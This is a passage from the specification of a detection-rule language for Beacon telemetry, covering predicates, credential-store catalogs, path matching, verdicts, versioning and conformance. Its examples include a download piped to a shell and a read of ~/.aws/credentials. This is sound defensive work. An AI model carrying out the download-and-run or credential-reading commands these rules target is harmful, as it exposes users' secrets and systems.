  followed, each after a newline, by the bodies of the here-documents of its commands that
  no piece holds. What lies between two pieces is not in the span. When a word, a
  redirection target, a here-document body or a `NAME=value` prefix of the command or of
  one of those writers takes a variable's value, the span is instead the line from its start
  to the end of the last piece, unless every such variable is one the environment sets
  (`HOME`, `PWD`, `OLDPWD`, `USER`, `LOGNAME`, `SHELL`, `TMPDIR`, `HOSTNAME`, `PATH`, `LANG`,
  `TERM`, `UID`, `EUID`, `PPID`, `RANDOM`, `SECONDS`, `LINENO`, `OSTYPE`, `HOSTTYPE`, `?`,
  `$`, `#`, `!`) and no statement at or before the command that uses it assigns it. An entry
  that comes from a command line another command hands on has the `span` of the entry of the
  line itself that it came from. The span over-approximates on purpose and always holds the
  command's own text. The reference derivation is `shellcmd.Read` (`Line.Spans`).
- `earlier_stages` and `later_stages` (since v1.3; a rule that selects either MUST declare
  `spec: threat-rules/v1.3` or later) on an entry of `e.command.parsed_commands` are lists of
  integers: the 0-based indexes, in `e.command.parsed_commands` and in ascending order, of the
  entries with the same `pipeline` and a lower `stage`, and of those with the same `pipeline`
  and a higher `stage`. For `curl u | tee f | sh`, whose entries are `curl`, `tee` and `sh`,
  `curl` has `later_stages` `[1, 2]`, `tee` has `earlier_stages` `[0]` and `later_stages`
  `[2]`, and `sh` has `earlier_stages` `[0, 1]`. Entries at the same stage (the commands
  inside one compound stage) are in neither list of each other, and both lists are empty for
  an entry alone in its pipeline. They say nothing `pipeline` and `stage` do not; they exist
  so that a rule about two stages of one pipeline (a download piped to a shell) asks the
  commands of that pipeline,
  `c.later_stages.exists(i, e.command.parsed_commands[i].name == "sh")`, where comparing
  `pipeline` and `stage` of every pair of entries grows with the square of the line's
  commands. The reference derivation is `threatrules.ParsedCommands`.
- `e.system_context` is on the wire, not derived: on `session.context` it names what the
  runtime gave the model. `kind` is `skill_listing` for a skill index, `source` is where
  Beacon read it (`system_prompt`, `transcript`), and `skills` names each listed skill as
  `skill_name` and `skill_name_hash`, so a rule can select an index without matching its
  text: `e.system_context.skills.exists(s, s.skill_name == "deploy")`.
- An engine MUST reject (at load) any rule whose CEL expression fails to compile or does
  not type to `bool`. Because field paths are checked against the event schema, a typo
  like `e.fil.path` is a load-time error.

## Predicates

Since v1.3. A predicate is a named expression a rule calls like a function:

```yaml
spec: threat-rules/v1.3
match: credential_file_read(e)
```

A predicate is not a CEL function. An engine expands it where it is called, before the
expression is type-checked, so a rule that calls one is the rule with the predicate's body
written out: it has the same verdicts, the same errors, and the same evaluation cost. A rule
whose expression calls a predicate MUST declare `spec: threat-rules/v1.3` or later, and at
least the `spec` of the definitions file that defines the predicate. An engine that sets a
definitions file aside for needing a newer spec MUST set aside with it every rule, and every
predicate definition, that calls one of its predicates, and load the rest of the pack.

Predicates are defined by the **definitions** of the rule pack the rule belongs to: the files
beside its rules whose names end in `.predicates.yaml` or `.catalog.yaml`, anywhere under the
pack's directory. An engine MUST load a pack's definitions before its rules and compile each
rule against them. A rule loaded on its own has none, and a call to a predicate it does not
have is a load-time error. Two packs are two sets of definitions: the rules of one never
compile against the definitions of the other. The reference engine keeps the definitions of
installed rules in the rule store beside them, under the name each file declares, and embeds
the baseline's with the baseline.

### Predicate definitions (`*.predicates.yaml`)

```yaml
library: credentials
version: 1
spec: threat-rules/v1.3
definitions:
  - name: command_reads_credential_file
    params: [c]
    description: A parsed command takes in a credential file.
    body: c.file_reads.exists(f, credential_path(f.path, "likely", "cloud", "ssh", "dotenv"))
    tests:
      - name: cat_credentials
        match: e.command.parsed_commands.exists(c, command_reads_credential_file(c))
        verdict: match
        events:
          - { event: { action: command.executed }, command: { command: "cat ~/.aws/credentials" } }
```

| Field | Required | Type / values | Meaning |
|---|---|---|---|
| `library` | yes | string `^[a-z0-9][a-z0-9-]*$` | The file's identity. Two files of a pack MUST NOT declare the same one. |
| `version` | yes | int ≥ 1 | Content revision. |
| `spec` | no | as a rule's | Minimum spec version the file needs. An engine MUST read it before it rejects any unknown field, and sets aside a file that needs a newer version than it implements, as it does a rule, with what calls its predicates. A body MUST NOT call a predicate whose file needs a newer version than its own. |
| `description` | no | string | Documentation only. |
| `definitions` | yes | list ≥ 1 | The predicates. |
| `definitions[].name` | yes | string `^[a-z][a-z0-9_]*$` | How the predicate is called. Unique across the pack's definitions, and not a name CEL has (a function, a macro, a reserved word, or `e`). |
| `definitions[].params` | yes | list ≥ 1 of distinct identifiers | The names the body is written over. Every one MUST be used by the body. |
| `definitions[].description` | yes | non-empty string | What the predicate is true for. |
| `definitions[].body` | yes | CEL string | The expression. It MUST read nothing but its parameters: a predicate that needs the event takes it as a parameter. It MAY call other predicates of the pack, but a predicate MUST NOT call itself, directly or through another. |
| `definitions[].tests` | yes | list ≥ 1 | Fixtures, each `{name, match, verdict, events}`. `match` is an expression that calls the predicate, and the fixture passes when `match` gives `verdict` over `events` as a single-event rule's `match` would. `match` MAY be omitted when `params` is `[e]`, and is then the predicate called with `e`. |

Expansion is by substitution: the call `p(a, b)` is the body with each parameter replaced
by its argument, wherever the parameter appears, so an argument is evaluated as often as the
body uses it. Expansion is hygienic: a variable the body binds itself (the `f` of
`x.exists(f, ..)`) never captures an argument, so `p(f)` called inside a rule's own
`exists(f, ..)` still means the rule's `f`. A call with the wrong number of arguments is a
load-time error. A predicate is called only as `name(..)`, never as a method. Where
substitution leaves two string literals joined by `+`, the expansion is the one literal they
make, so a body MAY build a pattern from a fixed part and a parameter
(`c.args.matches("\\A..." + rest)`) and a call that passes a literal gives the engine one
constant pattern.

A predicate MAY bind one of its parameters for its caller: it does when its body uses the
parameter as the variable of a comprehension. The call then passes a name for that
parameter (any identifier but `e`, not an expression), and the arguments the body places
inside that comprehension MAY use the name. With

```yaml
  - name: some_word
    params: [c, w, cond]
    body: c.argv.exists(w, cond)
```

the call `some_word(c, word, word.startsWith("--force"))` is
`c.argv.exists(word, word.startsWith("--force"))`. This is how a predicate takes a condition
and decides what it is asked of: a list of one names a value, as in
`[c.span].exists(t, cond)`. A parameter the body binds MUST NOT also be read outside that
binding, and passing anything but a name for it is a load-time error. The name means nothing
outside the call.

### Catalogs (`*.catalog.yaml`)

A catalog is a reviewed list of named things that a predicate tests membership of. The
corpus has one, `credential-stores`: where credentials are kept and how they are got out.

| Field | Required | Type / values | Meaning |
|---|---|---|---|
| `catalog` | yes | string `^[a-z0-9][a-z0-9-]*$` | The file's identity. Two files of a pack MUST NOT declare the same one. |
| `version`, `spec`, `description` | | | As for predicate definitions. |
| `predicates.path` | no | predicate name | The predicate true for a path that is one of the catalog's stores of files. |
| `predicates.command` | no | predicate name | The predicate true for a parsed command that reads one of the catalog's stores of commands. |
| `predicates.mention` | no | predicate name | The predicate true for a text that names one of the catalog's stores of files. |
| `predicates.redacted` | no | predicate name | The predicate true for a command line in which redaction replaced the name of a command that reads one of the catalog's stores of commands. |
| `kinds` | yes | list of `{id, title}` | The groups a store may belong to. |
| `stores` | yes | list ≥ 1 | The stores. |
| `stores[].id`, `title` | yes | string | Identity within the catalog, and a name. |
| `stores[].kind` | yes | one of `kinds[].id` | The store's group. |
| `stores[].tier` | yes | `definite` \| `likely` | `definite`: exists to hold what the catalog is of, or hands it over. `likely`: often does and often does not. |
| `stores[].match`, `exclude` | one of `match` or `commands` | lists of path patterns | The paths that are the store, and the ones among them that are not. |
| `stores[].commands` | one of `match` or `commands` | list of `{name, words, flags}` | The commands that read the store. |
| `stores[].examples` | yes | list of strings | Paths for a store of files, command lines for a store of commands. Each MUST be this store, and there MUST be one for each pattern of `match` and each entry of `commands`. |
| `stores[].counterexamples` | no | list of strings | Paths or command lines that MUST NOT be any store of the catalog, with one for each pattern of `exclude`. |

A catalog's examples and counterexamples hold for every expression generated from it, as well
as for its stores: an engine that checks a catalog (lint, install) evaluates the expression of
each of its predicate forms, for each tier and for every kind and each kind, on every example
and counterexample, and requires the answer the stores give.

A catalog's predicate takes what it is asked about, then optionally a tier and then kinds,
each a string literal: `credential_path(e.file.path)` is true for a store of either tier,
`credential_path(f.path, "definite")` for a `definite` store, and
`credential_command(c, "likely", "keychain", "ssh")` for a store of either tier whose kind is
one of those. A selection of `likely` stores includes the `definite` ones. The predicate
over commands is asked of one entry of `e.command.parsed_commands` and reads its `name` and
`args`.

The other two predicates are asked of a text, for where there is no path and no parsed
command to ask. `mention` is for a command line that does not parse, or a prompt handed to
another program: it is true when the text names a file a path pattern matches. A name is
written with letters, digits and `_ . ~ % + -`, so it starts after a character that is none of
those and ends before one that is none of those and no separator, with a full stop that ends
a sentence allowed between; a `*` runs over those characters only, and a directory of a `**`
over anything but whitespace and quotes. A pattern of one component without a `.` (a plain
word such as `credentials`) counts only directly after a separator. A store with `exclude`
patterns is not mentioned by a text that also names something those patterns match.
`redacted` is for a command line as a log holds it. A log's redaction replaces a value that
looks like a secret, and where a command substitution is put in a secret's place the value
can begin with the command's name. Redaction keeps a substitution that opens with a plain
command name, but one that opens with an assignment still loses it: of
`TOKEN=$(GH_TOKEN=$(gh auth token) ./x)` the log holds `TOKEN=[REDACTED] auth token) ./x)`.
(A Beacon before the release that introduced v1.3 lost it after every secret's label:
`curl -u "ci:[REDACTED] auth token)"` for `curl -u "ci:$(gh auth token)"`, and
`TOKEN=[REDACTED] auth token)` for `TOKEN=$(gh auth token)`.) The predicate is true when the
text holds `[REDACTED]`, whitespace, and then, within the same command, an entry's `words` in
order and one of its `flags`. An entry has this form only when what is left tells the
command from another: two `words` or more, one word with `flags`, one word that is more than
letters and digits, or no words and a flag that is a whole option word (which then follows
`[REDACTED]` after other options only). Both are coarser than the predicates over a path and
a parsed command, and a rule SHOULD use them only beside those.

A **path pattern** names a file by the last components of its path, so it is anchored by
construction: `.aws/credentials` matches `/home/u/.aws/credentials` and matches neither
`/home/u/.aws/credentials.bak` nor `/home/u/my.aws/credentials`. Components are separated
by `/` in a pattern and by `/` or `\` in a path, and letters match without regard to case
(RE2's `(?i)`). Within a component, `*` is any run of characters that are not a separator,
also none, and `{a,b,}` is one of its alternatives, which may be empty and may contain `*`.
A component that is `**` is any number of whole non-empty components, also none, and a
pattern that ends in `/**` matches every path under the directory the rest names. There is
no other syntax. A path is a store when it matches one of the store's `match` patterns and
none of its `exclude` patterns.

A **command** is a store when it matches one of the store's `commands`: `name` is a pattern
component for the entry's `name`; `words`, each a pattern component, are words that follow
each other in that order somewhere in `args`; and `flags` are options of which one MUST be
among the words of `args`. A flag of one letter or digit is a short option, alone or in a
cluster of letters and digits (`w` matches `-w` and `-aw`), and matches in its own case; any
other flag is a pattern component for a whole word, which may be followed by `=` and a
value. `name`, `words` and the longer flags match without regard to case.

The reference implementation is `pkg/asymptoteobserve/concepts`, which also renders a
catalog's selections as the regular expressions a predicate expands to; `rules/concepts/`
holds the corpus's definitions and the generated reference of its catalog. A rule of a pack
that ships a catalog SHOULD call it rather than carry a regular expression that spells out
its stores, which stops agreeing with the catalog the next time either changes; the
reference lint (`beacon rules lint`) fails a rule whose own patterns, matched against a
path, a command line or a parsed command's `args`, name two or more of a catalog's stores.

## Verdict model

An engine evaluates the sequence it is given; putting a real event stream into the order the
events happened is the caller's responsibility. Beacon events carry a nanosecond `timestamp`
and an optional per-writer `sequence` for that purpose, and `beacon scan` sorts by
`(timestamp, sequence)` before evaluating — the order lines appear in a log is not their
emission order.

An engine produces one of two verdicts for a rule against an ordered event sequence:

- `match` — the rule fired.
- `no_match` — it did not.

Conformance is defined entirely in these terms: for each fixture, an engine MUST produce
the fixture's declared `verdict`.

## Versioning

A spec version is `threat-rules/v<major>.<minor>`; `v1` is `v1.0`. A minor version only adds
optional fields, so every rule valid under an earlier minor stays valid. A major version may
change meaning.

A rule declares the version it needs in `spec`, not the version current when it was written,
so a corpus mixes versions and a rule moves to a newer `spec` only when it adopts a newer
feature. That keeps the rest of a corpus loadable by an older engine.

An engine MUST read a rule's `spec` before it rejects any unknown field, and MUST NOT evaluate
a rule whose `spec` is newer than the version it implements. It SHOULD set that rule aside with
a diagnostic naming the rule, the version the rule needs, and the version the engine supports,
and continue loading the rest of the corpus. The reference engine skips such rules with a
warning in `beacon scan`, `beacon rules list`, `add`, and `pull`, and reports them as `SKIP`
lines that fail `beacon rules lint`.

Engines released before v1.1 do not read `spec`: they reject a rule that carries it, or any
v1.1 field, as an unknown field, and refuse the directory that contains it.

### Changelog

- **v1.3**: `args`, `cwd`, `file_reads`, `file_writes`, `script_sends`, `socket_redirects`,
  `runs_read`, `span`, `earlier_stages` and `later_stages` on each entry of
  `e.command.parsed_commands`, and `e.command.parsed_incomplete`.
  `name` and `file_effects` find the command behind `timeout`, `nice`, `ionice`, `stdbuf`,
  `doas`, `torsocks`, `proxychains`, `caffeinate`, `setsid`, `chronic`, `uv run`,
  `poetry run`, `pipenv run`, `bundle exec` and `mise exec`, and behind a path whose
  directory is unknown (`~/bin/tool`), without a Windows executable's suffix and after a
  PowerShell assignment; `command -v` names no command. A shell's
  here-document or here-string script is read as commands the way its `-c` script is, and so
  are the command line `xargs`, `find -exec`, `ssh`, `docker exec`, `kubectl exec`, `su -c`,
  `eval`, `watch` and `trap` hand on, the command a wrapper runs somewhere else
  (`sudo -i`, `env -C`), the script a pipe sends a shell from a stage that prints its own
  words (`echo 'cmd' | sh`), a PowerShell's `-Command` script, and the commands an
  interpreter's inline script runs through a
  call with literal arguments (`os.system("..")`), three levels deep. A declaration
  (`export`) is an entry. `file_effects` and `file_writes` list the file a download saves
  (`curl -o`, `wget -O`), `dd of=`, and the local destination of `scp` and `rsync`;
  `file_writes` also lists the directory an archive or a clone lands in.
  [Predicates](#predicates): named expressions a rule calls, defined by the pack's
  definitions files.
- **v1.2**: the derived field `e.command.parsed_commands`.
- **v1.1**: `correlation.order` (`sequence` default, or `any` for order-insensitive steps),
  and the per-rule `spec` field with the engine rules above.
- **v1**: initial version.

## Maturity ladder

`status` gates what a rule must prove:

- `experimental` — valid (all CEL compiles) and ≥ 1 fixture.
- `stable` — valid, **and** at least one `match` fixture **and** at least one `no_match`
  fixture, **and** all fixtures produce their declared verdict.
- `deprecated` — must still parse and validate; fixtures optional.

A pack MUST NOT contain duplicate `id`s.

## Conformance

An engine conforms if, for every rule in a pack:

1. It loads the pack's definitions, then loads and validates the rule against them
   (structural + CEL compile/type-check).
2. It enforces the maturity gate for the rule's `status`.
3. For every fixture, evaluating `events` yields the declared `verdict`.

and, for the pack's definitions, every fixture of every predicate definition yields its
declared `verdict`, and every catalog's examples and counterexamples hold. An engine is not
required to run the definitions' fixtures each time it loads a pack, as it is not required to
run a rule's.

The reference implementation lives in
`pkg/asymptoteobserve/threatrules` and is exercised by its conformance test.
